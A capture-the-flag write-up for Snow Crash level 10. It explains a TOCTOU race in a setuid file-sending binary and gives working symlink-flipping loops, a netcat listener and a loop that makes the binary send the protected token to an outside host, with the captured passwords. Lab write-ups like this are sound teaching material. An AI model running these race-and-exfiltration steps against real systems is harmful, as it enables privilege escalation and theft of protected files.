Snow Crash – Level10 Writeup (Baby Steps, Pro Explanation)


Objective

Exploit a race condition vulnerability in a setuid binary to bypass an access check and retrieve the protected token.

This level teaches:

Race conditions

TOCTOU vulnerabilities

Symbolic link abuse

Privilege escalation logic

Network exfiltration

🪜 Step 1 – Initial Enumeration

List files:

ls -l

We see:

-rwsr-sr-x+ 1 flag10 level10 10817 level10
-rw-------  1 flag10 flag10     26 token
🔎 Important Observations
1️⃣ Setuid Binary

level10 has:

-rwsr-sr-x

The s means:

👉 When executed, it runs as flag10.

This is crucial.

2️⃣ Token File
-rw------- 1 flag10 flag10 token

Only flag10 can read it.

We cannot.

So we must trick the binary into reading it for us.

🪜 Step 2 – Test Program Behavior

Run without arguments:

./level10

Output:

./level10 file host
    sends file to host if you have access to it

So:

It sends a file to a remote host (port 6969).

Test token:

./level10 token localhost

Output:

You don't have access to token

So the program checks if we have access before sending.

Step 3 – Understand The Check

Using strace (very important):

strace ./level10 token localhost

You’ll see it calls:

access("token", R_OK)

This is the key.

It checks access first.

Then later it opens the file.

That creates a vulnerability.

💣 What Is The Vulnerability?

This is a classic:

👉 TOCTOU (Time Of Check To Time Of Use)

The program:

Checks if you can read the file

Then later opens it

These two actions are separate

If we change the file between those two steps…

We win.

🪜 Step 4 – Prepare The Attack

We need:

A file we can access

A symbolic link we can rapidly switch

A network listener to receive the token

🖥 Step 4.1 – Start Listener (On Host)

On your host machine:

nc -l 6969

Now it waits for incoming data.

🪜 Step 4.2 – Prepare Files

Create a harmless file:

touch public

Now create a symlink attack loop:

while true; do
    ln -sf token flip
    ln -sf public flip
done &


while true; do
    ln -sf ~/user/level10/token /tmp/token
    ln -sf  /tmp/random /tmp/token
done &

What this does:

Rapidly switches flip between:

token (protected)

public (accessible)

Thousands of times per second.

🪜 Step 5 – Trigger the Race

Now execute in loop:

while true; do
    ./level10 flip YOUR_HOST_IP
done

Replace YOUR_HOST_IP with your host’s IP.

🧠 What Happens Internally

Sometimes:

access("flip") checks while it points to public → OK

Before open("flip"), the symlink switches to token

The program opens token with flag10 privileges

Sends its contents to your netcat listener

That tiny timing window is the race condition.

🏁 Step 6 – Capture The Token

On your listener:

woupa2yuojeeaaed06riuj63c

That’s the password for flag10.

🪜 Step 7 – Switch User
su flag10

Enter:

woupa2yuojeeaaed06riuj63c

Then:

getflag

Output:

Check flag.Here is your token : feulo4b72j7edeahuete3no7c

Level completed.

🧠 What This Level Teaches
🔹 Race Conditions

When two operations depend on timing, attackers can exploit the gap.

🔹 TOCTOU

Time Of Check To Time Of Use:

Check permission

Then use file

Without rechecking

That’s insecure design.

🔹 Symbolic Link Abuse

Symlinks are powerful tools in local privilege escalation.

🔹 Real-World Relevance

This vulnerability appears in:

Sudo misconfigurations

Temporary file handling

Backup scripts

File upload handlers

Old UNIX daemons

TOCTOU is a real exploitation technique.
